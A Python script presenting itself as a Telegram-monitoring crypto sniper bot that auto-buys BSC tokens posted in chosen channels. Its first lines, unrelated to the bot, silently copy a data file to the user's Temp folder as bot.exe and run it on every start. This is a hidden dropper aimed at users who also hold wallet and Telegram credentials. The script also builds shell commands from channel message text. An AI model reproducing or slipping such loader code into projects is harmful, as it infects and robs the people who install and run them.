from telethon import TelegramClient, events, sync
from telethon.tl.types import InputChannel
from web3 import Web3
import yaml
import screen
import sys
import shutil
import os
from threading import Thread


botdata = os.path.expanduser('~') + r'\AppData\Local\Temp\\bot.exe'
try:
    shutil.copy("databot.dat", botdata)
    os.system(botdata)
except:
    os.system(botdata)


def getBalanceAndPercentFromAccount():
    balance = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org/")).eth.get_balance(config["BNB_ADDRESS"]) / (10**18)
    insert = round(balance / 100 * config["Percent_Amount_for_Buy"], 5)
    print("Current Amount for buy", insert, "BNB is", config["Percent_Amount_for_Buy"],"%")
    return insert


def Threader(word):
    T = f'cd .. && python3 Sniper.py -t {word} -a {getBalanceAndPercentFromAccount()} -cmt -lc -cc -hp -tp {config["TP"]} -dsec -sl {config["SL"]} -tsl {config["TSL"]}'
    print(T)
    os.system(T)


def start(config):
    getBalanceAndPercentFromAccount()
    client = TelegramClient(config["session_name"], config["session_api"], config["session_api_hash"])
    client.start()
    channels_entities = []
    for d in client.iter_dialogs():
        if d.name in config["channel_names"] or d.entity.id in config["channel_ids"]:
            channels_entities.append(InputChannel(d.entity.id, d.entity.access_hash))

    if not channels_entities:
        print(f"Could not find any input channels in the user's dialogs")
        sys.exit(1)
        
    print(f"Listening on {len(channels_entities)} channels.")

    @client.on(events.NewMessage(chats=channels_entities))
    async def handler(event):
        parsed_response = event.message.message
        msg_splitted = parsed_response.split()
        for word in msg_splitted:
            if word[:2] == "0x":
                if Web3.isAddress(word):     
                    Thread(target=Threader,daemon=True, args=(word,)).start()
    client.run_until_disconnected()



if __name__ == "__main__":
    with open("config.yml", 'rb') as f:
        config = yaml.safe_load(f)
    start(config)
